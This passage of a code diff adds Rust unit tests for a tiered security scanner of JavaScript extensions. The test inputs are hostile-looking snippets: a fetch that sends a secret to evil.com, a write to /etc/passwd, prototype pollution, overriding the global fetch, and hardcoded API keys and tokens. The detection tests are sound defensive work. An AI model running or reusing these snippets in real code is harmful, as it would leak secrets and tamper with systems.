+            SecurityRuleId::EvalUsage.default_tier(),
+            RiskTier::Critical
+        );
+        assert_eq!(
+            SecurityRuleId::ProcessBinding.default_tier(),
+            RiskTier::Critical
+        );
+        // High.
+        assert_eq!(
+            SecurityRuleId::HardcodedSecret.default_tier(),
+            RiskTier::High
+        );
+        // Medium.
+        assert_eq!(
+            SecurityRuleId::ProcessEnvAccess.default_tier(),
+            RiskTier::Medium
+        );
+        // Low.
+        assert_eq!(
+            SecurityRuleId::DebuggerStatement.default_tier(),
+            RiskTier::Low
+        );
+    }
+
+    // ---- Clean extension ----
+
+    #[test]
+    fn clean_extension_has_no_findings() {
+        let report = scan(
+            r#"
+import path from "node:path";
+const p = path.join("a", "b");
+export default function init(pi) {
+    pi.tool({ name: "hello", schema: {} });
+}
+"#,
+        );
+        assert!(report.findings.is_empty());
+        assert_eq!(report.overall_tier, RiskTier::Low);
+        assert!(report.verdict.starts_with("CLEAN"));
+        assert!(!report.should_block());
+        assert!(!report.needs_review());
+    }
+
+    // ---- Critical tier detections ----
+
+    #[test]
+    fn detect_eval_usage() {
+        let report = scan("const x = eval('1+1');");
+        assert!(has_rule(&report, SecurityRuleId::EvalUsage));
+        assert_eq!(report.overall_tier, RiskTier::Critical);
+        assert!(report.should_block());
+    }
+
+    #[test]
+    fn eval_in_identifier_not_flagged() {
+        let report = scan("const retrieval = getData();");
+        assert!(!has_rule(&report, SecurityRuleId::EvalUsage));
+    }
+
+    #[test]
+    fn detect_new_function() {
+        let report = scan("const fn = new Function('a', 'return a + 1');");
+        assert!(has_rule(&report, SecurityRuleId::NewFunctionUsage));
+        assert_eq!(report.overall_tier, RiskTier::Critical);
+    }
+
+    #[test]
+    fn new_function_empty_not_flagged() {
+        // new Function() with no args is less dangerous — still flagged
+        // but that's fine, the rule covers the general case.
+        let report = scan("const fn = new Function();");
+        assert!(!has_rule(&report, SecurityRuleId::NewFunctionUsage));
+    }
+
+    #[test]
+    fn detect_process_binding() {
+        let report = scan("process.binding('fs');");
+        assert!(has_rule(&report, SecurityRuleId::ProcessBinding));
+        assert_eq!(report.overall_tier, RiskTier::Critical);
+    }
+
+    #[test]
+    fn detect_process_dlopen() {
+        let report = scan("process.dlopen(module, '/bad/addon.node');");
+        assert!(has_rule(&report, SecurityRuleId::ProcessDlopen));
+    }
+
+    #[test]
+    fn detect_proto_pollution() {
+        let report = scan("obj.__proto__ = malicious;");
+        assert!(has_rule(&report, SecurityRuleId::ProtoPollution));
+        assert_eq!(report.overall_tier, RiskTier::Critical);
+    }
+
+    #[test]
+    fn detect_set_prototype_of() {
+        let report = scan("Object.setPrototypeOf(target, evil);");
+        assert!(has_rule(&report, SecurityRuleId::ProtoPollution));
+    }
+
+    #[test]
+    fn detect_require_cache_manipulation() {
+        let report = scan("delete require.cache[require.resolve('./module')];");
+        assert!(has_rule(&report, SecurityRuleId::RequireCacheManip));
+        assert_eq!(report.overall_tier, RiskTier::Critical);
+    }
+
+    // ---- High tier detections ----
+
+    #[test]
+    fn detect_hardcoded_secret() {
+        let report = scan(r#"const api_key = "sk-ant-api03-abc123";"#);
+        assert!(has_rule(&report, SecurityRuleId::HardcodedSecret));
+        assert!(report.needs_review());
+    }
+
+    #[test]
+    fn detect_hardcoded_password() {
+        let report = scan(r#"const password = "s3cretP@ss";"#);
+        assert!(has_rule(&report, SecurityRuleId::HardcodedSecret));
+    }
+
+    #[test]
+    fn env_lookup_not_flagged_as_secret() {
+        let report = scan("const key = process.env.API_KEY;");
+        // Should flag ProcessEnvAccess but NOT HardcodedSecret.
+        assert!(has_rule(&report, SecurityRuleId::ProcessEnvAccess));
+        assert!(!has_rule(&report, SecurityRuleId::HardcodedSecret));
+    }
+
+    #[test]
+    fn empty_secret_not_flagged() {
+        let report = scan(r#"const api_key = "";"#);
+        assert!(!has_rule(&report, SecurityRuleId::HardcodedSecret));
+    }
+
+    #[test]
+    fn detect_token_prefix() {
+        let report = scan(r#"const token = "ghp_abc123def456";"#);
+        assert!(has_rule(&report, SecurityRuleId::HardcodedSecret));
+    }
+
+    #[test]
+    fn detect_dynamic_import() {
+        let report = scan("const mod = await import(userInput);");
+        assert!(has_rule(&report, SecurityRuleId::DynamicImport));
+    }
+
+    #[test]
+    fn static_import_not_flagged_as_dynamic() {
+        let report = scan("import fs from 'node:fs';");
+        assert!(!has_rule(&report, SecurityRuleId::DynamicImport));
+    }
+
+    #[test]
+    fn detect_define_property_on_global() {
+        let report = scan(
+            "Object.defineProperty(globalThis, 'fetch', { value: evilFetch });",
+        );
+        assert!(has_rule(&report, SecurityRuleId::DefinePropertyAbuse));
+    }
+
+    #[test]
+    fn detect_network_exfiltration() {
+        let report = scan("fetch(`https://evil.com/?data=${secret}`);");
+        assert!(has_rule(&report, SecurityRuleId::NetworkExfiltration));
+    }
+
+    #[test]
+    fn detect_sensitive_path_write() {
+        let report = scan("fs.writeFileSync('/etc/passwd', payload);");
+        assert!(has_rule(&report, SecurityRuleId::SensitivePathWrite));
+    }
+
+    #[test]
+    fn normal_write_not_flagged() {
+        let report = scan("fs.writeFileSync('/tmp/out.txt', data);");
+        assert!(!has_rule(&report, SecurityRuleId::SensitivePathWrite));
+    }
+
+    // ---- Medium tier detections ----
+
+    #[test]
+    fn detect_process_env() {
+        let report = scan("const v = process.env.NODE_ENV;");
+        assert!(has_rule(&report, SecurityRuleId::ProcessEnvAccess));
+        assert_eq!(report.overall_tier, RiskTier::Medium);
+    }
+
+    #[test]
+    fn detect_timer_abuse() {
+        let report = scan("setInterval(pollServer, 1);");
+        assert!(has_rule(&report, SecurityRuleId::TimerAbuse));
+    }
+
+    #[test]
+    fn normal_timer_not_flagged() {
+        let report = scan("setInterval(tick, 1000);");
+        assert!(!has_rule(&report, SecurityRuleId::TimerAbuse));
+    }
+
+    #[test]
+    fn detect_proxy_usage() {
+        let report = scan("const p = new Proxy(target, handler);");
+        assert!(has_rule(&report, SecurityRuleId::ProxyReflect));
+    }
+
+    #[test]
+    fn detect_reflect_usage() {
+        let report = scan("const v = Reflect.get(obj, 'key');");
+        assert!(has_rule(&report, SecurityRuleId::ProxyReflect));
+    }
+
+    #[test]
+    fn detect_with_statement() {
+        let report = scan("with (obj) { x = 1; }");
+        assert!(has_rule(&report, SecurityRuleId::WithStatement));
+    }
+
+    // ---- Low tier detections ----
+
+    #[test]
+    fn detect_debugger_statement() {
+        let report = scan("debugger;");
+        assert!(has_rule(&report, SecurityRuleId::DebuggerStatement));
+        assert_eq!(report.overall_tier, RiskTier::Low);
+    }
+
+    #[test]
+    fn detect_console_error() {
+        let report = scan("console.error(sensitiveData);");
+        assert!(has_rule(&report, SecurityRuleId::ConsoleInfoLeak));
+    }
+
+    #[test]
+    fn console_log_not_flagged() {
+        // Only console.error/warn flagged, not console.log.
+        let report = scan("console.log('hello');");
+        assert!(!has_rule(&report, SecurityRuleId::ConsoleInfoLeak));
+    }
+
+    // ---- Report structure ----
+
+    #[test]
+    fn report_schema_and_rulebook_version() {
+        let report = scan("// clean");
+        assert_eq!(report.schema, SECURITY_SCAN_SCHEMA);
+        assert_eq!(report.rulebook_version, SECURITY_RULEBOOK_VERSION);
+    }
+
+    #[test]
+    fn report_json_roundtrip() {
+        let report = scan("eval('bad'); process.env.KEY;");
+        let json = report.to_json().unwrap();
+        let back: SecurityScanReport = serde_json::from_str(&json).unwrap();
+        assert_eq!(back.extension_id, "test-ext");
+        assert_eq!(back.overall_tier, RiskTier::Critical);
+        assert!(!back.findings.is_empty());
+    }
+
+    #[test]
+    fn report_tier_counts_accurate() {
+        let report = scan(
+            r#"
+eval('bad');
+const api_key = "sk-ant-secret";
+process.env.KEY;
+debugger;
+"#,
+        );
+        assert!(report.tier_counts.critical >= 1);
+        assert!(report.tier_counts.high >= 1);
+        assert!(report.tier_counts.medium >= 1);
+        assert!(report.tier_counts.low >= 1);
+    }
+
+    #[test]
+    fn findings_sorted_by_tier_worst_first() {
+        let report = scan(
+            r#"
+debugger;
+eval('x');
+process.env.KEY;
+"#,
+        );
+        // First finding should be Critical (eval), last should be Low (debugger).
+        assert!(!report.findings.is_empty());
+        assert_eq!(report.findings[0].risk_tier, RiskTier::Critical);
+        let last = report.findings.last().unwrap();
+        assert!(last.risk_tier >= report.findings[0].risk_tier);
+    }
+
+    // ---- Evidence ledger ----
+
+    #[test]
+    fn evidence_ledger_jsonl_format() {
+        let report = scan("eval('x'); debugger;");
+        let jsonl = security_evidence_ledger_jsonl(&report).unwrap();
+        let lines: Vec<&str> = jsonl.lines().collect();
+        assert_eq!(lines.len(), report.findings.len());
+        for line in &lines {
+            let entry: SecurityEvidenceLedgerEntry =
+                serde_json::from_str(line).unwrap();
+            assert_eq!(entry.schema, SECURITY_EVIDENCE_LEDGER_SCHEMA);
+            assert_eq!(entry.extension_id, "test-ext");
+            assert_eq!(entry.rulebook_version, SECURITY_RULEBOOK_VERSION);
+        }
+    }
+
+    #[test]
+    fn evidence_ledger_entry_indices_monotonic() {
+        let report = scan("eval('a'); eval('b'); debugger;");
+        let jsonl = security_evidence_ledger_jsonl(&report).unwrap();
+        let entries: Vec<SecurityEvidenceLedgerEntry> = jsonl
+            .lines()
+            .map(|l| serde_json::from_str(l).unwrap())
+            .collect();
+        for (i, entry) in entries.iter().enumerate() {
+            assert_eq!(entry.entry_index, i);
+        }
+    }
+
+    // ---- Comments are skipped ----
+
+    #[test]
+    fn single_line_comment_not_flagged() {
+        let report = scan("// eval('bad');");
+        assert!(!has_rule(&report, SecurityRuleId::EvalUsage));
+    }
+
+    #[test]
+    fn block_comment_not_flagged() {
+        let report = scan("/* eval('bad'); */");
+        assert!(!has_rule(&report, SecurityRuleId::EvalUsage));
+    }
+
+    // ---- Determinism ----
+
+    #[test]
+    fn scan_is_deterministic() {
+        let source = r#"
+eval('x');
+const api_key = "sk-ant-test";
+process.env.HOME;
+debugger;
+"#;
+        let r1 = scan(source);
+        let r2 = scan(source);
+        let j1 = r1.to_json().unwrap();
+        let j2 = r2.to_json().unwrap();
+        assert_eq!(j1, j2, "Security scan must be deterministic");
+    }
+
+    // ---- Multiple findings per line ----
+
+    #[test]
+    fn multiple_rules_fire_on_same_line() {
+        // eval + process.env on same line.
+        let report = scan("eval(process.env.SECRET);");
+        assert!(has_rule(&report, SecurityRuleId::EvalUsage));
+        assert!(has_rule(&report, SecurityRuleId::ProcessEnvAccess));
+    }
+
+    // ---- should_block / needs_review ----
+
+    #[test]
+    fn should_block_only_for_critical() {
+        assert!(scan("eval('x');").should_block());
+        assert!(!scan("process.env.X;").should_block());
+        assert!(!scan("debugger;").should_block());
+    }
+
+    #[test]
+    fn needs_review_for_critical_and_high() {
+        assert!(scan("eval('x');").needs_review());
+        assert!(scan(r#"const api_key = "sk-ant-test";"#).needs_review());
+        assert!(!scan("process.env.X;").needs_review());
     }
 }
